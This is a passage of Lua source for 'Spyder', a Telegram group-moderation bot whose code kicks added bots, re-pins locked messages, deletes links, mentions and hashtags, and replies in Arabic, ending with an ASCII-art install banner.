tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = Msgs},function(arg,data);MsgsDel = {};for i=0 ,data.total_count_ do;if not data.messages_[i] then;if not MsgsDel[0] then;MsgsDel[0] = Msgs[i];end;table.insert(MsgsDel,Msgs[i]);end;end;if MsgsDel[0] then;tdcli_function({ID="DeleteMessages",chat_id_ = arg.chat_id_,message_ids_=MsgsDel},function(arg,data)end,nil);end;end,{chat_id_=msg.chat_id_})
tdcli_function({ID = "GetChannelMembers",channel_id_ = getChatId(msg.chat_id_).ID,filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(arg,tah) local admins = tah.members_ for i=0 , #admins do if tah.members_[i].status_.ID ~= "ChatMemberStatusEditor" and not is_mod(msg) then tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_ = msg.chat_id_,user_id_ = admins[i].user_id_,status_ = {ID = "ChatMemberStatusKicked"},}, function(arg,f) end, nil) end end end,nil)  
end
end     
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageChatAddMembers" then  
local mem_id = msg.content_.members_  
local Bots = redis:get('Spyder:'..bot_id.."lock:Bot:kick"..msg.chat_id_) 
for i=0,#mem_id do  
if msg.content_.members_[i].type_.ID == "UserTypeBot" and not Mod(msg) and Bots == "del" then   
Spyder = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local Json_config = JSON.decode(Spyder)
if Json_config.ok == true and #mem_id == i then
local Msgs = {}
Msgs[0] = msg.id_
msgs_id = msg.id_-1048576
for i=1 ,(150) do 
msgs_id = msgs_id+1048576
table.insert(Msgs,msgs_id)
end
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = Msgs},function(arg,data);MsgsDel = {};for i=0 ,data.total_count_ do;if not data.messages_[i] then;if not MsgsDel[0] then;MsgsDel[0] = Msgs[i];end;table.insert(MsgsDel,Msgs[i]);end;end;if MsgsDel[0] then;tdcli_function({ID="DeleteMessages",chat_id_ = arg.chat_id_,message_ids_=MsgsDel},function(arg,data)end,nil);end;end,{chat_id_=msg.chat_id_})
tdcli_function({ID = "GetChannelMembers",channel_id_ = getChatId(msg.chat_id_).ID,filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(arg,tah) local admins = tah.members_ for i=0 , #admins do if tah.members_[i].status_.ID ~= "ChatMemberStatusEditor" and not Mod(msg) then tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_ = msg.chat_id_,user_id_ = admins[i].user_id_,status_ = {ID = "ChatMemberStatusKicked"},}, function(arg,f) end, nil) end end end,nil)  
end
end     
end
end
if msg.content_.ID == 'MessagePinMessage' then
if Constructor(msg) then 
redis:set('Spyder:'..bot_id..'Pin:Id:Msg'..msg.chat_id_,msg.content_.message_id_)
else
local Msg_Pin = redis:get('Spyder:'..bot_id..'Pin:Id:Msg'..msg.chat_id_)
if Msg_Pin and redis:get('Spyder:'..bot_id.."lockpin"..msg.chat_id_) then
PinMessage(msg.chat_id_,Msg_Pin)
end
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageChatDeletePhoto" or msg.content_.ID == "MessageChatChangePhoto" or msg.content_.ID == 'MessagePinMessage' or msg.content_.ID == "MessageChatJoinByLink" or msg.content_.ID == "MessageChatAddMembers" or msg.content_.ID == 'MessageChatChangeTitle' or msg.content_.ID == "MessageChatDeleteMember" then   
if redis:get('Spyder:'..bot_id..'lock:tagservr'..msg.chat_id_) then  
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false
end    
end   
--------------------------------------------------------------------------------------------------------------
DevSpyder(data.message_,data)
--------------------------------------------------------------------------------------------------------------
if Chat_Type == 'GroupBot' and Groups_Users(msg.chat_id_) == true then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ then
redis:set('Spyder:'..bot_id..'user:Name'..msg.sender_user_id_,(data.username_))
end
--------------------------------------------------------------------------------------------------------------
if tonumber(data.id_) == tonumber(bot_id) then
return false
end
end,nil)   
end
elseif (data.ID == "UpdateMessageEdited") then
local msg = data
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.message_id_)},function(extra, result, success)
redis:incr('Spyder:'..bot_id..'edits'..result.chat_id_..result.sender_user_id_)
local Text = result.content_.text_
if redis:get('Spyder:'..bot_id.."lock:edit"..msg.chat_id_) and not Text and not BasicConstructor(result) then
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local username = data.username_
local name = data.first_name_
local iduser = data.id_
local users = ('[@'..data.username_..']' or iduser)
send(msg.chat_id_,0,'⌔︙ تم التعديل على الميديا \n\n⌔︙ الشخص الي قام بالتعديل\n➺➺➺ •⊱{ '..users..' }⊰•') 
end,nil)
DeleteMessage(msg.chat_id_,{[0] = msg.message_id_}) 
end
local text = result.content_.text_
if not Mod(result) then
------------------------------------------------------------------------
if text:match("[Jj][Oo][Ii][Nn][Cc][Hh][Aa][Tt]") or text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text:match("[Tt].[Mm][Ee]") or text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text:match("[Tt][Ee][Ll][Ee][Ss][Cc][Oo].[Pp][Ee]") then
if redis:get('Spyder:'..bot_id.."lock:Link"..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
return false
end 
end
------------------------------------------------------------------------
if text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text:match("[Tt].[Mm][Ee]") or text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text:match("[Tt][Ee][Ll][Ee][Ss][Cc][Oo].[Pp][Ee]") then
if redis:get('Spyder:'..bot_id.."lock:Link"..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
return false
end 
end
------------------------------------------------------------------------
if text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text:match("[Tt].[Mm][Ee]") or text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text:match("[Tt][Ee][Ll][Ee][Ss][Cc][Oo].[Pp][Ee]") then
if redis:get('Spyder:'..bot_id.."lock:Link"..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
return false
end  
end
------------------------------------------------------------------------
if text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text:match("[Tt].[Mm][Ee]") or text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text:match("[Tt][Ee][Ll][Ee][Ss][Cc][Oo].[Pp][Ee]") then
if redis:get('Spyder:'..bot_id.."lock:Link"..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
return false
end  
end 
------------------------------------------------------------------------
if text:match("[hH][tT][tT][pP][sT]") or text:match("[tT][eE][lL][eE][gG][rR][aA].[Pp][Hh]") or text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa].[Pp][Hh]") then
if redis:get('Spyder:'..bot_id.."lock:Link"..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
return false
end  
end 
------------------------------------------------------------------------
if text:match("(.*)(@)(.*)") then
if redis:get('Spyder:'..bot_id.."lock:user:name"..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
return false
end  
end
------------------------------------------------------------------------
if text:match("@") then
if redis:get('Spyder:'..bot_id.."lock:user:name"..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
return false
end  
end 
------------------------------------------------------------------------
if text:match("(.*)(#)(.*)") then
if redis:get('Spyder:'..bot_id.."lock:hashtak"..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
return false
end  
end 
------------------------------------------------------------------------
if text:match("#") then
if redis:get('Spyder:'..bot_id.."lock:user:name"..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
return false
end  
end 
------------------------------------------------------------------------
if text:match("/") then
if redis:get('Spyder:'..bot_id.."lock:Cmd"..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
return false
end 
end 
if text:match("(.*)(/)(.*)") then
if redis:get('Spyder:'..bot_id.."lock:Cmd"..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
return false
end 
end
local Spyderbot = redis:get('Spyder:'..bot_id.."Add:Filter:Rp2"..text..result.chat_id_)   
if Spyderbot then    
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0,"⌔︙العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n⌔︙["..Spyderbot.."] \n") 
else
send(msg.chat_id_,0,"⌔︙العضو : {["..data.first_name_.."](T.ME/Spyder)}\n⌔︙["..Spyderbot.."] \n") 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
return false
end
end
end,nil)
elseif data.ID == ("UpdateMessageSendSucceeded") then
local msg = data.message_
local text = msg.content_.text_
local Get_Msg_Pin = redis:get('Spyder:'..bot_id..'Msg:Pin:Chat'..msg.chat_id_)
if Get_Msg_Pin ~= nil then
if text == Get_Msg_Pin then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,d) if d.ID == 'Ok' then;redis:del('Spyder:'..bot_id..'Msg:Pin:Chat'..msg.chat_id_);end;end,nil)   
elseif (msg.content_.sticker_) then 
if Get_Msg_Pin == msg.content_.sticker_.sticker_.persistent_id_ then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,d) redis:del('Spyder:'..bot_id..'Msg:Pin:Chat'..msg.chat_id_) end,nil)   
end
end
if (msg.content_.animation_) then 
if msg.content_.animation_.animation_.persistent_id_ == Get_Msg_Pin then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,d) redis:del('Spyder:'..bot_id..'Msg:Pin:Chat'..msg.chat_id_) end,nil)   
end
end
if (msg.content_.photo_) then
if msg.content_.photo_.sizes_[0] then
id_photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[1] then
id_photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[2] then
id_photo = msg.content_.photo_.sizes_[2].photo_.persistent_id_
end	
if msg.content_.photo_.sizes_[3] then
id_photo = msg.content_.photo_.sizes_[3].photo_.persistent_id_
end
if id_photo == Get_Msg_Pin then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,d) redis:del('Spyder:'..bot_id..'Msg:Pin:Chat'..msg.chat_id_) end,nil)   
end
end
end
elseif (data.ID == "UpdateOption" and data.name_ == "my_id") then 
local list = redis:smembers('Spyder:'..bot_id.."Users:ids") 
for k,v in pairs(list) do 
tdcli_function({ID='GetChat',chat_id_ = v},function(arg,data) end,nil) 
end         
local list = redis:smembers('Spyder:'..bot_id..'Groups_Users') 
for k,v in pairs(list) do 
tdcli_function({ID='GetChat',chat_id_ = v
},function(arg,data)
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusMember" then
redis:srem('Spyder:'..bot_id..'Groups_Users',v)  
tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_=v,user_id_=bot_id,status_={ID = "ChatMemberStatusLeft"},},function(e,g) end, nil) 
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusLeft" then
redis:srem('Spyder:'..bot_id..'Groups_Users',v)  
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusKicked" then
redis:srem('Spyder:'..bot_id..'Groups_Users',v)  
end
if data and data.code_ and data.code_ == 400 then
redis:srem('Spyder:'..bot_id..'Groups_Users',v)  
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusEditor" then
redis:sadd('Spyder:'..bot_id..'Groups_Users',v)  
end 
end,nil)
end
end -- end new msg
end -- end callback
-------------------------------
--[[
══════════════════════════════════════════════════╗
░██████╗██████╗░██╗░░░██╗██████╗░███████╗██████╗░ ║
██╔════╝██╔══██╗╚██╗░██╔╝██╔══██╗██╔════╝██╔══██╗ ║
╚█████╗░██████╔╝░╚████╔╝░██║░░██║█████╗░░██████╔╝ ║
░╚═══██╗██╔═══╝░░░╚██╔╝░░██║░░██║██╔══╝░░██╔══██╗ ║
██████╔╝██║░░░░░░░░██║░░░██████╔╝███████╗██║░░██║ ║
╚═════╝░╚═╝░░░░░░░░╚═╝░░░╚═════╝░╚══════╝╚═╝░░╚═╝ ║
══════════════════════════════════════════════════╝
⌔︙- Done Installations Source Spyder 
⌔︙- Thanks For your use Source Spyder
══════════════════════════════
--]]









